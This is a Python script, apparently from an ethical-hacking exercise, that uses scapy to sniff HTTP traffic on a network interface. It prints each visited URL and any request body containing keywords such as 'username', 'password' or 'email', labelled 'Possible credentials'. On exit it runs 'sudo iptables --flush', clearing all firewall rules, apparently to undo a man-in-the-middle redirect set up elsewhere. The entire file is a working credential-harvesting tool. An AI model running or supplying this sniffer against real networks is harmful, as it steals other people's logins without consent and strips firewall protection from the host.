import scapy.all as scapy
from scapy.layers import http
import subprocess
import optparse
import re
import sys
import traceback


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff")
    (arguments, options) = parser.parse_args()

    ifconfig_results = subprocess.check_output(["ifconfig"])
    all_interfaces = re.findall(r"[a-z]{3,4}\d", str(ifconfig_results))

    if (not arguments.interface or not bool(re.match(r"^[a-z]{3,4}\d$", arguments.interface)) or
            arguments.interface not in all_interfaces):
        print("[-] Invalid input; Please specify an interface; Use -h or --help for more info")
    else:
        return arguments


def sniff_packets(interface):
    try:
        print("[+] Starting packet sniffer")
        print("[+] Packet sniffer started successfully!")
        print("[+] Sniffing packets at " + interface + "\n")
        scapy.sniff(iface=interface, store=False, prn=processed_packets)
    except KeyboardInterrupt:
        print("\n[-] Closing packet sniffer")
    finally:
        cleanup()


def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode()
    path = packet[http.HTTPRequest].Path.decode()
    url = f"http://{host}{path}"
    return url


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
        keywords = ["username", "uname", "user", "login", "signup", "signin", "password", "pass", "email", "mail"]
        for keyword in keywords:
            if keyword in load.lower():
                return load


def processed_packets(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("[+] URL                  ==>  " + url)
            credentials = get_credentials(packet)
            if credentials:
                print("\n\n[+] Possible credentials ==>  " + credentials + "\n\n")

    except Exception as e:
        print("\n\n[!] An error occurred: ", str(e) + "\n\n")
        traceback.print_exc()
        print("\n\n[-] Terminating session")
        sys.exit(1)


def cleanup():
    subprocess.call(["sudo", "iptables", "--flush"])
    print("\n\n[-] Flushing iptables")
    print("[-] Packet sniffer ended successfully!")


arguments = get_arguments()
sniff_packets(arguments.interface)
